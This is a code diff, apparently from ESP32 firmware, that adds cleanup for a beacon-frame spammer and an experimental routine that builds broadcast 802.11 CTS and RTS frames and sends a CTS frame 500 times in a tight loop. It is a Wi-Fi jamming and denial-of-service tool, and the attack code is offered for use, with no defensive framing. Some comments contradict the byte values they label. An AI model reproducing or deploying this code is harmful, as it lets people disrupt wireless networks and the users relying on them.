@@ -245,6 +245,18 @@ void spammerPreparer() {
   }
 }
 
+// Frees all memory allocated by spammerPreparer
+void freeSpammerMemory() {
+  BeaconFrameLoader *current = beaconFrames;
+  while (current != nullptr) {
+    BeaconFrameLoader *next = (BeaconFrameLoader *)current->next;
+    if (current->data) free(current->data);
+    free(current);
+    current = next;
+  }
+  beaconFrames = nullptr;
+}
+
 // void skibidiPreparer() {
 //   BeaconFrameLoader *beaconFrameLoader;
 //   BeaconFrameLoader *lastFrameLoader = nullptr;
@@ -309,3 +321,43 @@ void beaconSpammer(bool *isRunning) {
 //     }
 //   }
 // }
+
+// this is an experimental function to send cts frames
+
+uint8_t ctsTemplate[] = {
+  0xc4, 0x00, // type, subtype c4: CTS
+  0x00, 0x7d, // duration 30000 microseconds
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF // reciever (target)
+};
+
+uint8_t rtsTemplate[] = {
+  0x0b, 0x00, // type, subtype b4: RTS
+  0x75, 0x30, // duration 30000 microseconds
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // bssid (target)
+  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
+};
+
+// Структура CTS-фрейма (управляющий фрейм)
+struct __attribute__((packed)) {
+    wifi_pkt_rx_ctrl_t rx_ctrl;                             // Игнорируем при отправке
+    uint8_t frame_ctrl[2] = {0xc4, 0x00};                   // Тип фрейма (0xC4 для CTS)
+    uint16_t duration = -1;                                 // Длительность резервирования
+    uint8_t ra[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};   // MAC получателя
+} cts_frame;
+
+void send_cts_frame(const uint8_t ch, uint16_t duration) {
+    // // Заполняем заголовок фрейма
+    // cts_frame.frame_ctrl[0] = 0xC4; // Тип: управляющий (0x01), подтип: CTS (0x0C) -> 0b11000100 = 0xC4
+    // cts_frame.frame_ctrl[1] = 0x00; // Флаги
+    // cts_frame.duration = duration;  // Время резервирования (например, 300 мкс)
+    // memcpy(cts_frame.ra, ra, 6);    // Копируем MAC получателя
+
+    // Отправляем фрейм
+    // Оптимизация для ускорения цикла
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    #pragma GCC unroll 500
+    for (int i = 0; i < 500; i++) esp_wifi_80211_tx(WIFI_IF_STA, &cts_frame, sizeof(cts_frame), false);
+}
+
+//// HYPER EXPEREMENTAL
+
